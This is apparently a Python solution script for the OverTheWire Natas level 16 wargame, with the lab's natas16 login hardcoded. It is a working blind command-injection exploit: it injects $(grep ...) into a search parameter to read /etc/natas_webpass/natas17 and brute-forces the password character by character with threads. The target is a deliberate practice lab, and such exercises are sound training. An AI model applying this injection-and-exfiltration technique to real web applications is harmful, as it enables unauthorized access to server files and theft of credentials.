import threading
from threading import Thread
import requests
from requests.auth import HTTPBasicAuth 
  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh') 
filteredchars = 'AGHNPQSW035789bcdghkmnqrsw' #26
passwd = ""


def atack(c):
    global passwd
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ^' + passwd + c + ' /etc/natas_webpass/natas17)', auth=auth)     
    if 'Africans' not in r.text:           
         passwd = passwd + c
         print(passwd)           

def mti_tak_kenel():
    threads = []
    for char in filteredchars:       
       t = Thread(target=atack, args=(char))
       t.start()
       threads.append(t)
    for t in threads:
     t.join()       
   
if __name__ == "__main__":
  for i in range(32):  
    mti_tak_kenel()
  print('result: '+ passwd)